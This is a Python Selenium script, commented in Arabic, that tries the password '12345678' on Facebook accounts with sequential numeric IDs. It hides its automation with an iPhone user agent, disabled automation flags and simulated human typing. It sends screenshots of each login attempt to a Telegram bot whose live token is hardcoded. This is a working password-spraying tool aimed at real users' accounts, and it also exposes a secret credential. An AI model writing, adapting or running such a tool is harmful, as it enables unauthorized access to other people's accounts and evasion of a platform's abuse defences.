import time
import random
import requests
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.keys import Keys

# 🔑 إعدادات تليجرام
TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
CHAT_ID = "5653032481"

def send_to_tg(text):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
    except: pass

def send_photo_tg(photo_path, caption):
    try:
        with open(photo_path, 'rb') as photo:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
                          data={'chat_id': CHAT_ID, 'caption': caption}, files={'photo': photo})
    except: pass

def check_account(uid):
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-blink-features=AutomationControlled')
    
    # بصمة هاتف حديثة (iPhone 15 Pro) للتخفي
    user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
    options.add_argument(f'user-agent={user_agent}')
    options.add_argument('--window-size=390,844') # مقاس شاشة آيفون

    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    
    try:
        pas = "12345678" # كلمة تجريبية
        driver.get("https://www.facebook.com") # الدخول للموقع العادي
        time.sleep(random.uniform(3, 5))
        
        # إدخال البيانات في الموقع العادي
        email_field = driver.find_element(By.NAME, "email")
        pass_field = driver.find_element(By.NAME, "pass")
        
        # محاكاة كتابة بشرية
        for char in uid:
            email_field.send_keys(char)
            time.sleep(0.1)
        for char in pas:
            pass_field.send_keys(char)
            time.sleep(0.1)
            
        # لقطة شاشة قبل الضغط
        img_pre = f"pre_{uid}.png"
        driver.save_screenshot(img_pre)
        send_photo_tg(img_pre, f"📸 محاكاة إدخال: {uid}")
        
        pass_field.send_keys(Keys.RETURN) # ضغط Enter للدخول
        time.sleep(7)
        
        # لقطة شاشة بعد المحاولة
        img_post = f"post_{uid}.png"
        driver.save_screenshot(img_post)
        send_photo_tg(img_post, f"🔄 نتيجة المحاولة لـ: {uid}")
        
        # تنظيف الصور
        if os.path.exists(img_pre): os.remove(img_pre)
        if os.path.exists(img_post): os.remove(img_post)
        
    except Exception as e:
        send_to_tg(f"❌ خطأ مع {uid}: {str(e)}")
    finally:
        driver.quit()

def run_main():
    start_id = 26701173
    send_to_tg("🚀 انطلاق الفحص المتخفي (5 حسابات فقط) مع بصمة حديثة...")
    
    # فحص 5 حسابات فقط كما طلبت
    ids = [str(start_id + i) for i in range(5)]
    for uid in ids:
        check_account(uid)
        time.sleep(random.uniform(2, 4))

if __name__ == "__main__":
    run_main()
